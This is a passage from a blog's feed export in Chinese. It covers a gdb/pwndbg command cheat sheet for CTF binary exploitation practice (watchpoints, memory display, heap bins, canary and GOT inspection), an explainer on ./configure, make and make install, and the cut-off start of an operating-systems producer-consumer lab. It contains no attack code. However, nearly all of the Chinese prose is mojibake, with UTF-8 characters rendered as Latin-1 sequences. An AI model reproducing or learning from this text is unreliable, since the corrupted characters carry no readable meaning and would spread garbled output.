<strong>å†…å­˜æ–­ç‚¹æŒ‡ä»¤watchï¼š</strong></h4><ul><li><code>watch 0x123456</code> //0x123456åœ°å€çš„æ•°æ®æ”¹å˜çš„æ—¶å€™ä¼šæ–­</li><li><code>watch a</code> //å˜é‡aæ”¹å˜çš„æ—¶å€™ä¼šæ–­</li><li><code>info watchpoints</code> //æŸ¥çœ‹watchæ–­ç‚¹ä¿¡æ¯</li></ul><h4 id="æ•è·æ–­ç‚¹catch"><a class="markdownIt-Anchor" href="#æ•è·æ–­ç‚¹catch"></a> <strong>æ•è·æ–­ç‚¹catchï¼š</strong></h4><ul><li><code>catch syscall</code> //syscallç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™æ–­ä½</li><li><code>tcatch syscall</code> //syscallç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™æ–­ä½ï¼Œåªæ–­ä¸€æ¬¡</li><li><code>info break</code> //catchçš„æ–­ç‚¹å¯ä»¥é€šè¿‡i bæŸ¥çœ‹</li></ul><blockquote><p>é™¤syscallå¤–è¿˜å¯ä»¥ä½¿ç”¨çš„æœ‰ï¼š</p><p>1ï¼‰throw: æŠ›å‡ºå¼‚å¸¸</p><p>2ï¼‰catch: æ•è·å¼‚å¸¸</p><p>3ï¼‰exec: execè¢«è°ƒç”¨</p><p>4ï¼‰fork: forkè¢«è°ƒç”¨</p><p>5ï¼‰vfork: vforkè¢«è°ƒç”¨</p><p>6ï¼‰load: åŠ è½½åŠ¨æ€åº“</p><p>7ï¼‰load libname: åŠ è½½åä¸ºlibnameçš„åŠ¨æ€åº“</p><p>8ï¼‰unload: å¸è½½åŠ¨æ€åº“</p><p>9ï¼‰unload libname: å¸è½½åä¸ºlibnameçš„åŠ¨æ€åº“</p><p>10ï¼‰syscall [args]: è°ƒç”¨ç³»ç»Ÿè°ƒç”¨ï¼Œargså¯ä»¥æŒ‡å®šç³»ç»Ÿè°ƒç”¨å·ï¼Œæˆ–è€…ç³»ç»Ÿåç§°</p></blockquote><h3 id="æ‰“å°æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#æ‰“å°æŒ‡ä»¤"></a> æ‰“å°æŒ‡ä»¤</h3><h4 id="æŸ¥çœ‹å†…å­˜æŒ‡ä»¤x"><a class="markdownIt-Anchor" href="#æŸ¥çœ‹å†…å­˜æŒ‡ä»¤x"></a> <strong>æŸ¥çœ‹å†…å­˜æŒ‡ä»¤xï¼š</strong></h4><ul><li><p><code>x /nuf 0x123456</code> //<strong>å¸¸ç”¨</strong>ï¼ŒxæŒ‡ä»¤çš„æ ¼å¼æ˜¯ï¼šxç©ºæ ¼/nfuï¼Œnfuä»£è¡¨ä¸‰ä¸ªå‚æ•°</p><ul><li>nä»£è¡¨æ˜¾ç¤ºå‡ ä¸ªå•å…ƒï¼ˆè€Œä¸æ˜¯æ˜¾ç¤ºå‡ ä¸ªå­—èŠ‚ï¼Œåé¢çš„uè¡¨ç¤ºä¸€ä¸ªå•å…ƒå¤šå°‘ä¸ªå­—èŠ‚ï¼‰ï¼Œæ”¾åœ¨â€™/'åé¢</li><li>uä»£è¡¨ä¸€ä¸ªå•å…ƒå‡ ä¸ªå­—èŠ‚ï¼Œb(ä¸€ä¸ªå­—èŠ‚)ï¼Œh(äºŒä¸ªå­—èŠ‚)ï¼Œw(å››å­—èŠ‚)ï¼Œg(å…«å­—èŠ‚)</li><li>fä»£è¡¨æ˜¾ç¤ºæ•°æ®çš„æ ¼å¼ï¼Œfå’Œuçš„é¡ºåºå¯ä»¥äº’æ¢ï¼Œä¹Ÿå¯ä»¥åªæœ‰ä¸€ä¸ªæˆ–è€…ä¸å¸¦nï¼Œç”¨çš„æ—¶å€™å¾ˆçµæ´»<ul><li>x æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚<br>d æŒ‰åè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚<br>u æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºæ— ç¬¦å·æ•´å‹ã€‚<br>o æŒ‰å…«è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚<br>t æŒ‰äºŒè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚<br>a æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚<br>c æŒ‰å­—ç¬¦æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚<br>f æŒ‰æµ®ç‚¹æ•°æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚<br>s æŒ‰å­—ç¬¦ä¸²æ˜¾ç¤ºã€‚<br>b æŒ‰å­—ç¬¦æ˜¾ç¤ºã€‚<br>i æ˜¾ç¤ºæ±‡ç¼–æŒ‡ä»¤ã€‚</li></ul></li></ul></li><li><p><code>x /10gx 0x123456</code> //<strong>å¸¸ç”¨</strong>ï¼Œä»0x123456å¼€å§‹æ¯ä¸ªå•å…ƒå…«ä¸ªå­—èŠ‚ï¼Œåå…­è¿›åˆ¶æ˜¾ç¤ºæ˜¯ä¸ªå•å…ƒçš„æ•°æ®</p></li><li><p><code>x /10xd $rdi</code> //ä»rdiæŒ‡å‘çš„åœ°å€å‘åæ‰“å°10ä¸ªå•å…ƒï¼Œæ¯ä¸ªå•å…ƒ4å­—èŠ‚çš„åè¿›åˆ¶æ•°</p></li><li><p><code>x /10i 0x123456</code> //<strong>å¸¸ç”¨</strong>ï¼Œä»0x123456å¤„å‘åæ˜¾ç¤ºåæ¡æ±‡ç¼–æŒ‡ä»¤</p></li></ul><h4 id="æ‰“å°æŒ‡ä»¤pprint"><a class="markdownIt-Anchor" href="#æ‰“å°æŒ‡ä»¤pprint"></a> <strong>æ‰“å°æŒ‡ä»¤p(print)ï¼š</strong></h4><ul><li><code>p fun_name</code> //æ‰“å°fun_nameçš„åœ°å€ï¼Œéœ€è¦ä¿ç•™ç¬¦å·</li><li><code>p 0x10-0x08</code> //è®¡ç®—0x10-0x08çš„ç»“æœ</li><li><code>p &amp;a</code> //æŸ¥çœ‹å˜é‡açš„åœ°å€</li><li><code>p *(0x123456)</code> //æŸ¥çœ‹0x123456åœ°å€çš„å€¼ï¼Œæ³¨æ„å’ŒxæŒ‡ä»¤çš„åŒºåˆ«ï¼ŒxæŒ‡ä»¤æŸ¥çœ‹åœ°å€çš„å€¼ä¸ç”¨æ˜Ÿå·</li><li><code>p $rdi</code> //æ˜¾ç¤ºrdiå¯„å­˜å™¨çš„å€¼ï¼Œæ³¨æ„å’Œxçš„åŒºåˆ«ï¼Œè¿™åªæ˜¯æ˜¾ç¤ºrdiçš„å€¼ï¼Œè€Œä¸æ˜¯rdiæŒ‡å‘çš„å€¼</li><li><code>p *($rdi)</code> //æ˜¾ç¤ºrdiæŒ‡å‘çš„å€¼</li></ul><h4 id="æ‰“å°æ±‡ç¼–æŒ‡ä»¤disass"><a class="markdownIt-Anchor" href="#æ‰“å°æ±‡ç¼–æŒ‡ä»¤disass"></a> <strong>æ‰“å°æ±‡ç¼–æŒ‡ä»¤disass</strong>ï¼š</h4><p><strong>disassemble</strong>çš„ç¼©å†™</p><ul><li><code>disass 0x123456</code> //æ˜¾ç¤º0x123456å‰åçš„æ±‡ç¼–æŒ‡ä»¤</li><li><code>x /10i 0x123456</code>//xä¹Ÿå¯ä»¥æ˜¾ç¤ºæŒ‡ä»¤ï¼Œiå°±è¡¨ç¤ºæ‰“å°æ±‡ç¼–æŒ‡ä»¤</li></ul><h4 id="æ‰“å°æºä»£ç æŒ‡ä»¤list"><a class="markdownIt-Anchor" href="#æ‰“å°æºä»£ç æŒ‡ä»¤list"></a> <strong>æ‰“å°æºä»£ç æŒ‡ä»¤listï¼š</strong></h4><ul><li><code>list</code> //æŸ¥çœ‹å½“å‰é™„è¿‘10è¡Œä»£ç ï¼Œè¦æœ‰æºç ï¼ŒlistæŒ‡ä»¤pwné¢˜ä¸­å‡ ä¹ä¸ç”¨ï¼Œä½†ä¸ºäº†å®Œæ•´æ€§è¿˜æ˜¯ç®€å•ä¸¾å‡ ä¸ªä¾‹å­</li><li><code>list 38</code> //æŸ¥çœ‹38è¡Œé™„è¿‘10è¡Œä»£ç </li><li><code>list 1,10</code> //æŸ¥çœ‹1-10è¡Œ</li><li><code>list main</code> //æŸ¥çœ‹mainå‡½æ•°å¼€å§‹10è¡Œ</li></ul><h3 id="ä¿®æ”¹å’ŒæŸ¥æ‰¾æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#ä¿®æ”¹å’ŒæŸ¥æ‰¾æŒ‡ä»¤"></a> <strong>ä¿®æ”¹å’ŒæŸ¥æ‰¾æŒ‡ä»¤</strong></h3><h4 id="ä¿®æ”¹æ•°æ®æŒ‡ä»¤set"><a class="markdownIt-Anchor" href="#ä¿®æ”¹æ•°æ®æŒ‡ä»¤set"></a> <strong>ä¿®æ”¹æ•°æ®æŒ‡ä»¤setï¼š</strong></h4><ul><li><code>set $â€‹rdi=0x10</code> //æŠŠrdiå¯„å­˜å™¨çš„å€¼å˜ä¸º0x10</li><li><code>set *(0x123456)=0x10</code> //0x123456åœ°å€çš„å€¼å˜ä¸º0x10ï¼Œæ³¨æ„å¸¦æ˜Ÿå·</li><li><code>set args â€œabcâ€ â€œdefâ€ â€œghâ€œ</code>//ç»™å‚æ•°123èµ‹å€¼</li><li><code>set args â€œpython -c â€˜print</code> â€œ1234\x7f\xdeâ€â€™â€ //ä½¿ç”¨pythonç»™å‚æ•°èµ‹å€¼ä¸å¯è§å­—ç¬¦</li></ul><h4 id="æŸ¥æ‰¾æ•°æ®"><a class="markdownIt-Anchor" href="#æŸ¥æ‰¾æ•°æ®"></a> <strong>æŸ¥æ‰¾æ•°æ®ï¼š</strong></h4><ul><li><code>search rdi</code> //ä»å½“å‰ä½ç½®å‘åæŸ¥åŒ…å«rdiçš„æŒ‡ä»¤ï¼Œè¿”å›è‹¥å¹²</li><li><code>search -h</code> //æŸ¥çœ‹searchå¸®åŠ©ï¼Œæˆ‘ä¹Ÿä¸å¤ªé•¿ç”¨è¿™ä¸ªæŒ‡ä»¤</li><li><code>find â€œhelloâ€</code> //æŸ¥æ‰¾helloå­—ç¬¦ä¸²ï¼Œpwndbgç‹¬æœ‰</li><li><code>ropgadget</code> //æŸ¥æ‰¾ropgadgetï¼Œpwndbgç‹¬æœ‰ï¼Œæ²¡å•¥ç”¨ï¼Œå¯ä»¥ç”¨å…¶ä»–å·¥å…·</li></ul><h3 id="å †æ“ä½œæŒ‡ä»¤"><a class="markdownIt-Anchor" href="#å †æ“ä½œæŒ‡ä»¤"></a> å †æ“ä½œæŒ‡ä»¤</h3><p>pwndbgæ’ä»¶ç‹¬æœ‰</p><ul><li><code>arena</code> //æ˜¾ç¤ºarenaçš„è¯¦ç»†ä¿¡æ¯</li><li><code>arenas</code> //æ˜¾ç¤ºæ‰€æœ‰arenaçš„åŸºæœ¬ä¿¡æ¯</li><li><code>arenainfo</code> //å¥½çœ‹çš„æ˜¾ç¤ºæ‰€æœ‰arenaçš„ä¿¡æ¯</li><li><code>bins</code> //å¸¸ç”¨ï¼ŒæŸ¥çœ‹æ‰€æœ‰ç§ç±»çš„å †å—çš„é“¾è¡¨æƒ…å†µ</li><li><code>fastbins</code> //å•ç‹¬æŸ¥çœ‹fastbinsçš„é“¾è¡¨æƒ…å†µ</li><li><code>largebins</code> //åŒä¸Šï¼Œå•ç‹¬æŸ¥çœ‹largebinsçš„é“¾è¡¨æƒ…å†µ</li><li><code>smallbins</code> //åŒä¸Šï¼Œå•ç‹¬æŸ¥çœ‹smallbinsçš„é“¾è¡¨æƒ…å†µ</li><li><code>unsortedbin</code> //åŒä¸Šï¼Œå•ç‹¬æŸ¥çœ‹unsortedbiné“¾è¡¨æƒ…å†µ</li><li><code>tcachebins</code> //åŒä¸Šï¼Œå•ç‹¬æŸ¥çœ‹tcachebinsçš„é“¾è¡¨æƒ…å†µ</li><li><code>tcache</code> //æŸ¥çœ‹tcacheè¯¦ç»†ä¿¡æ¯</li><li><code>heap</code> //æ•°æ®ç»“æ„çš„å½¢å¼æ˜¾ç¤ºæ‰€æœ‰å †å—ï¼Œä¼šæ˜¾ç¤ºä¸€å¤§å †</li><li><code>heapbase</code> //æŸ¥çœ‹å †èµ·å§‹åœ°å€</li><li><code>heapinfoã€heapinfoall</code> //æ˜¾ç¤ºå †å¾—ä¿¡æ¯ï¼Œå’Œbinsçš„æŒºåƒçš„ï¼Œæ²¡binså¥½ç”¨</li><li><code>parseheap</code> //æ˜¾ç¤ºå †ç»“æ„ï¼Œå¾ˆå¥½ç”¨</li><li><code>tracemalloc</code> //å¥½ç”¨ï¼Œä¼šè·Ÿæç¤ºæ‰€æœ‰æ“ä½œå †çš„åœ°æ–¹</li></ul><h3 id="å…¶ä»–pwndbgæ’ä»¶ç‹¬æœ‰æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#å…¶ä»–pwndbgæ’ä»¶ç‹¬æœ‰æŒ‡ä»¤"></a> <strong>å…¶ä»–pwndbgæ’ä»¶ç‹¬æœ‰æŒ‡ä»¤</strong></h3><ul><li><p><code>cyclc 50</code> //ç”Ÿæˆ50ä¸ªç”¨æ¥æº¢å‡ºçš„å­—ç¬¦ï¼Œå¦‚ï¼šaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</p></li><li><p><code>$reabse</code> //å¼€å¯PIEçš„æƒ…å†µçš„åœ°å€åç§»</p></li><li><p><code>b *$reabse(0x123456)</code> //æ–­ä½PIEçŠ¶æ€ä¸‹çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­0x123456çš„åœ°æ–¹</p></li><li><p><code>codebase</code> //æ‰“å°PIEåç§»ï¼Œä¸rebaseä¸åŒï¼Œè¿™æ˜¯æ‰“å°ï¼Œrebaseæ˜¯ä½¿ç”¨</p></li><li><p><code>stack</code> //æŸ¥çœ‹æ ˆ</p></li><li><p><code>retaddr</code> //æ‰“å°åŒ…å«è¿”å›åœ°å€çš„æ ˆåœ°å€</p></li><li><p><code>canary</code> //ç›´æ¥çœ‹canaryçš„å€¼</p></li><li><p><code>plt</code> //æŸ¥çœ‹pltè¡¨</p></li><li><p><code>got</code> //æŸ¥çœ‹gotè¡¨</p></li><li><p><code>hexdump</code> //æƒ³IDAé‚£æ ·æ˜¾ç¤ºæ•°æ®ï¼Œå¸¦å­—ç¬¦ä¸²</p></li></ul><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/Breeze_CAT/article/details/103789233">gdb+pwndbgé£Ÿç”¨æŒ‡å—</a></p>]]></content>
    
    
    <categories>
      
      <category>linuxåŸºç¡€</category>
      
    </categories>
    
    
    <tags>
      
      <tag>gdb</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linuxå‘½ä»¤è¯¦è§£ ./configureã€makeã€make install å‘½ä»¤</title>
    <link href="/posts/40823701/"/>
    <url>/posts/40823701/</url>
    
    <content type="html"><![CDATA[<p>è¿™äº›éƒ½æ˜¯å…¸å‹çš„ä½¿ç”¨GNUçš„AUTOCONFå’ŒAUTOMAKEäº§ç”Ÿçš„ç¨‹åºçš„å®‰è£…æ­¥éª¤</p><h2 id="ä¸€-åŸºæœ¬ä¿¡æ¯"><a class="markdownIt-Anchor" href="#ä¸€-åŸºæœ¬ä¿¡æ¯"></a> ä¸€ã€åŸºæœ¬ä¿¡æ¯</h2><p>1ã€./configure æ˜¯ç”¨æ¥æ£€æµ‹ä½ çš„å®‰è£…å¹³å°çš„ç›®æ ‡ç‰¹å¾çš„ã€‚æ¯”å¦‚å®ƒä¼šæ£€æµ‹ä½ æ˜¯ä¸æ˜¯æœ‰CCæˆ–GCCï¼Œå¹¶ä¸æ˜¯éœ€è¦CCæˆ–GCCï¼Œå®ƒæ˜¯ä¸ªshellè„šæœ¬ã€‚</p><p>2ã€make æ˜¯ç”¨æ¥ç¼–è¯‘çš„ï¼Œå®ƒä»Makefileä¸­è¯»å–æŒ‡ä»¤ï¼Œç„¶åç¼–è¯‘ã€‚</p><p>3ã€make installæ˜¯ç”¨æ¥å®‰è£…çš„ï¼Œå®ƒä¹Ÿä»Makefileä¸­è¯»å–æŒ‡ä»¤ï¼Œå®‰è£…åˆ°æŒ‡å®šçš„ä½ç½®ã€‚</p><p>æ³¨æ„ï¼šAUTOMAKEå’ŒAUTOCONFæ˜¯éå¸¸æœ‰ç”¨çš„ç”¨æ¥å‘å¸ƒCç¨‹åºçš„ä¸œè¥¿ã€‚</p><h2 id="äºŒ-è¯¦ç»†è§£é‡Š"><a class="markdownIt-Anchor" href="#äºŒ-è¯¦ç»†è§£é‡Š"></a> äºŒã€è¯¦ç»†è§£é‡Š</h2><h3 id="1-configureå‘½ä»¤"><a class="markdownIt-Anchor" href="#1-configureå‘½ä»¤"></a> 1ã€configureå‘½ä»¤</h3><p>è¿™ä¸€æ­¥ä¸€èˆ¬ç”¨æ¥ç”Ÿæˆ Makefileï¼Œä¸ºä¸‹ä¸€æ­¥çš„ç¼–è¯‘åšå‡†å¤‡ï¼Œä½ å¯ä»¥é€šè¿‡åœ¨ configure ååŠ ä¸Šå‚æ•°æ¥å¯¹å®‰è£…è¿›è¡Œæ§åˆ¶ï¼Œæ¯”å¦‚ä»£ç :./configure â€“prefix=/usr æ„æ€æ˜¯å°†è¯¥è½¯ä»¶å®‰è£…åœ¨ /usr ä¸‹é¢ï¼Œæ‰§è¡Œæ–‡ä»¶å°±ä¼šå®‰è£…åœ¨ /usr/bin ï¼ˆè€Œä¸æ˜¯é»˜è®¤çš„ /usr/local/bin),èµ„æºæ–‡ä»¶å°±ä¼šå®‰è£…åœ¨ /usr/shareï¼ˆè€Œä¸æ˜¯é»˜è®¤çš„/usr/local/shareï¼‰ã€‚åŒæ—¶ä¸€äº›è½¯ä»¶çš„é…ç½®æ–‡ä»¶ä½ å¯ä»¥é€šè¿‡æŒ‡å®š â€“sys-config= å‚æ•°è¿›è¡Œè®¾å®šã€‚æœ‰ä¸€äº›è½¯ä»¶è¿˜å¯ä»¥åŠ ä¸Š â€“withã€â€“enableã€â€“withoutã€â€“disable ç­‰ç­‰å‚æ•°å¯¹ç¼–è¯‘åŠ ä»¥æ§åˆ¶ï¼Œä½ å¯ä»¥é€šè¿‡å…è®¸ ./configure â€“help å¯Ÿçœ‹è¯¦ç»†çš„è¯´æ˜å¸®åŠ©ã€‚</p><p><img src="/posts/40823701/image-20211201145802464.png" alt="image-20211201145802464"></p><h3 id="2-make"><a class="markdownIt-Anchor" href="#2-make"></a> 2ã€make</h3><p>è¿™ä¸€æ­¥å°±æ˜¯ç¼–è¯‘ï¼Œå¤§å¤šæ•°çš„æºä»£ç åŒ…éƒ½ç»è¿‡è¿™ä¸€æ­¥è¿›è¡Œç¼–è¯‘ï¼ˆå½“ç„¶æœ‰äº›perlæˆ–pythonç¼–å†™çš„è½¯ä»¶éœ€è¦è°ƒç”¨perlæˆ–pythonæ¥è¿›è¡Œç¼–è¯‘ï¼‰ã€‚å¦‚æœ åœ¨ make è¿‡ç¨‹ä¸­å‡ºç° error ï¼Œä½ å°±è¦è®°ä¸‹é”™è¯¯ä»£ç ï¼ˆæ³¨æ„ä¸ä»…ä»…æ˜¯æœ€åä¸€è¡Œï¼‰ï¼Œç„¶åä½ å¯ä»¥å‘å¼€å‘è€…æäº¤ bugreportï¼ˆä¸€èˆ¬åœ¨ INSTALL é‡Œæœ‰æäº¤åœ°å€ï¼‰ï¼Œæˆ–è€…ä½ çš„ç³»ç»Ÿå°‘äº†ä¸€äº›ä¾èµ–åº“ç­‰ï¼Œè¿™äº›éœ€è¦è‡ªå·±ä»”ç»†ç ”ç©¶é”™è¯¯ä»£ç ã€‚</p><p>å¯èƒ½é‡åˆ°çš„é”™è¯¯ï¼šmake *** æ²¡æœ‰æŒ‡æ˜ç›®æ ‡å¹¶ä¸”æ‰¾ä¸åˆ° makefileã€‚ åœæ­¢ã€‚é—®é¢˜å¾ˆæ˜äº†ï¼Œæ²¡æœ‰Makefileï¼Œæ€ä¹ˆåŠï¼ŒåŸæ¥æ˜¯è¦å…ˆ./configure ä¸€ä¸‹ï¼Œå†makeã€‚</p><h3 id="3-make-insatll"><a class="markdownIt-Anchor" href="#3-make-insatll"></a> 3ã€make insatll</h3><p>è¿™æ¡å‘½ä»¤æ¥è¿›è¡Œå®‰è£…ï¼ˆå½“ç„¶æœ‰äº›è½¯ä»¶éœ€è¦å…ˆè¿è¡Œ make check æˆ– make test æ¥è¿›è¡Œä¸€äº›æµ‹è¯•ï¼‰ï¼Œè¿™ä¸€æ­¥ä¸€èˆ¬éœ€è¦ä½ æœ‰ root æƒé™ï¼ˆå› ä¸ºè¦å‘ç³»ç»Ÿå†™å…¥æ–‡ä»¶ï¼‰ã€‚</p><h2 id="ä¸‰-æ‰©å±•è¯´æ˜"><a class="markdownIt-Anchor" href="#ä¸‰-æ‰©å±•è¯´æ˜"></a> ä¸‰ã€æ‰©å±•è¯´æ˜</h2><p>Linuxçš„ç”¨æˆ·å¯èƒ½çŸ¥é“ï¼Œåœ¨Linuxä¸‹å®‰è£…ä¸€ä¸ªåº”ç”¨ç¨‹åºæ—¶ï¼Œä¸€èˆ¬å…ˆè¿è¡Œè„šæœ¬configureï¼Œç„¶åç”¨makeæ¥ç¼–è¯‘æºç¨‹åºï¼Œåœ¨è¿è¡Œmake installï¼Œæœ€åè¿è¡Œmake cleanåˆ é™¤ä¸€äº›ä¸´æ—¶æ–‡ä»¶ã€‚ä½¿ç”¨ä¸Šè¿°ä¸‰ä¸ªè‡ªåŠ¨å·¥å…·ï¼Œå°±å¯ä»¥ç”Ÿæˆconfigureè„šæœ¬ã€‚è¿è¡Œconfigureè„šæœ¬ï¼Œå°±å¯ä»¥ç”ŸæˆMakefileæ–‡ä»¶ï¼Œç„¶åå°±å¯ä»¥è¿è¡Œmakeã€make installå’Œmake cleanã€‚</p><p>configureæ˜¯ä¸€ä¸ªshellè„šæœ¬ï¼Œå®ƒå¯ä»¥è‡ªåŠ¨è®¾å®šæºç¨‹åºä»¥ç¬¦åˆå„ç§ä¸åŒå¹³å°ä¸ŠUnixç³»ç»Ÿçš„ç‰¹æ€§ï¼Œå¹¶ä¸”æ ¹æ®ç³»ç»Ÿåæ•°åŠç¯å¢ƒäº§ç”Ÿåˆé€‚çš„Makefileæ–‡ä»¶æˆ–æ˜¯Cçš„å¤´æ–‡ä»¶(header file)ï¼Œè®©æºç¨‹åºå¯ä»¥å¾ˆæ–¹ä¾¿åœ°åœ¨è¿™äº›ä¸åŒçš„å¹³å°ä¸Šè¢«ç¼–è¯‘è¿æ¥ã€‚</p><p>è¿™æ—¶ï¼Œå°±å¯è¿è¡Œconfigureè„šæœ¬äº†ï¼Œè¿è¡Œconfigureè„šæœ¬ï¼Œå°±å¯äº§ç”Ÿå‡ºç¬¦åˆGNUè§„èŒƒçš„Makefileæ–‡ä»¶äº†ï¼š $ ./configure</p><p>åˆ°æ­¤æ—¶ï¼Œå°±å¯ä»¥è¿è¡Œmakeè¿›è¡Œç¼–è¯‘ï¼Œåœ¨è¿è¡Œmake installè¿›è¡Œå®‰è£…äº†ï¼Œæœ€åè¿è¡Œmake cleanåˆ é™¤ä¸´æ—¶æ–‡ä»¶ã€‚</p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>make<br><span class="hljs-variable">$ </span>make install           (æ³¨ï¼šè¿è¡Œè¿™ä¸ªè¦æœ‰è¶³å¤Ÿçš„æƒé™)<br><span class="hljs-variable">$ </span>make clean<br></code></pre></div></td></tr></table></figure><p>åˆ©ç”¨configureæ‰€äº§ç”Ÿçš„Makefileæ–‡ä»¶æœ‰å‡ ä¸ªé¢„è®¾çš„ç›®æ ‡å¯ä¾›ä½¿ç”¨ï¼Œå…¶ä¸­å‡ ä¸ªé‡è¦çš„ç®€è¿°å¦‚ä¸‹ï¼š</p><ul><li><p>make allï¼šäº§ç”Ÿæˆ‘ä»¬è®¾å®šçš„ç›®æ ‡ï¼Œå³æ­¤èŒƒä¾‹ä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚åªæ‰“makeä¹Ÿå¯ä»¥ï¼Œæ­¤æ—¶ä¼šå¼€å§‹ç¼–è¯‘åŸå§‹ç ï¼Œç„¶åè¿ç»“ï¼Œå¹¶ä¸”äº§ç”Ÿå¯æ‰§è¡Œæ–‡ä»¶ã€‚</p></li><li><p>make cleanï¼šæ¸…é™¤ç¼–è¯‘äº§ç”Ÿçš„å¯æ‰§è¡Œæ–‡ä»¶åŠç›®æ ‡æ–‡ä»¶(object fileï¼Œ*.o)ã€‚</p></li><li><p>make distcleanï¼šé™¤äº†æ¸…é™¤å¯æ‰§è¡Œæ–‡ä»¶å’Œç›®æ ‡æ–‡ä»¶å¤–ï¼ŒæŠŠconfigureæ‰€äº§ç”Ÿçš„Makefileä¹Ÿæ¸…é™¤æ‰ã€‚</p></li><li><p>make installï¼šå°†ç¨‹åºå®‰è£…è‡³ç³»ç»Ÿä¸­ã€‚å¦‚æœåŸå§‹ç ç¼–è¯‘æ— è¯¯ï¼Œä¸”æ‰§è¡Œç»“æœæ­£ç¡®ï¼Œä¾¿å¯ä»¥æŠŠç¨‹åºå®‰è£…è‡³ç³»ç»Ÿé¢„è®¾çš„å¯æ‰§è¡Œæ–‡ä»¶å­˜æ”¾è·¯å¾„ã€‚å¦‚æœç”¨bin_PROGRAMSå®çš„è¯ï¼Œç¨‹åºä¼šè¢«å®‰è£…è‡³/usr/local/binè¿™ä¸ªç›®å½•ã€‚</p></li><li><p>make distï¼šå°†ç¨‹åºå’Œç›¸å…³çš„æ¡£æ¡ˆåŒ…è£…æˆä¸€ä¸ªå‹ç¼©æ–‡ä»¶ä»¥ä¾›å‘å¸ƒã€‚æ‰§è¡Œå®Œåœ¨ç›®å½•ä¸‹ä¼šäº§ç”Ÿä¸€ä¸ªä»¥PACKAGE-VERSION.tar.gzä¸ºåç§°çš„æ–‡ä»¶ã€‚ PACKAGEå’ŒVERSIONè¿™ä¸¤ä¸ªå˜æ•°æ˜¯æ ¹æ®configure.inæ–‡ä»¶ä¸­AM_INIT_AUTOMAKE(PACKAGEï¼ŒVERSION)çš„å®šä¹‰ã€‚åœ¨æ­¤èŒƒä¾‹ä¸­ä¼šäº§ç”Ÿtest-1.0.tar.gzçš„æ¡£æ¡ˆã€‚</p></li><li><p>make distcheckï¼šå’Œmake distç±»ä¼¼ï¼Œä½†æ˜¯åŠ å…¥æ£€æŸ¥åŒ…è£…åçš„å‹ç¼©æ–‡ä»¶æ˜¯å¦æ­£å¸¸ã€‚è¿™ä¸ªç›®æ ‡é™¤äº†æŠŠç¨‹åºå’Œç›¸å…³æ–‡ä»¶åŒ…è£…æˆtar.gzæ–‡ä»¶å¤–ï¼Œè¿˜ä¼šè‡ªåŠ¨æŠŠè¿™ä¸ªå‹ç¼©æ–‡ä»¶è§£å¼€ï¼Œæ‰§è¡Œ configureï¼Œå¹¶ä¸”è¿›è¡Œmake all çš„åŠ¨ä½œï¼Œç¡®è®¤ç¼–è¯‘æ— è¯¯åï¼Œä¼šæ˜¾ç¤ºè¿™ä¸ªtar.gzæ–‡ä»¶å¯ä¾›å‘å¸ƒäº†ã€‚è¿™ä¸ªæ£€æŸ¥éå¸¸æœ‰ç”¨ï¼Œæ£€æŸ¥è¿‡å…³çš„åŒ…ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥ç»™ä»»ä½•ä¸€ä¸ªå…·å¤‡GNUå¼€å‘ç¯å¢ƒ-çš„äººå»é‡æ–°ç¼–è¯‘ã€‚</p></li></ul><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.cnblogs.com/tinywan/p/7230039.html">Linux å‘½ä»¤è¯¦è§£ï¼ˆä¸‰ï¼‰./configureã€makeã€make install å‘½ä»¤</a></p>]]></content>
    
    
    <categories>
      
      <category>linuxåŸºç¡€</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ“ä½œç³»ç»Ÿå®éªŒå…­-ç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜</title>
    <link href="/posts/3994810f/"/>
    <url>/posts/3994810f/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸€-å®éªŒå†…å®¹"><a class="markdownIt-Anchor" href="#ä¸€-å®éªŒå†…å®¹"></a> ä¸€ã€å®éªŒå†…å®¹</h2><ul><li>æ¨¡æ‹Ÿæ“ä½œç³»ç»Ÿä¸­è¿›ç¨‹åŒæ­¥å’Œäº’æ–¥ã€‚</li></ul><h2 id="äºŒ-å®éªŒç›®çš„"><a class="markdownIt-Anchor" href="#äºŒ-å®éªŒç›®çš„"></a> 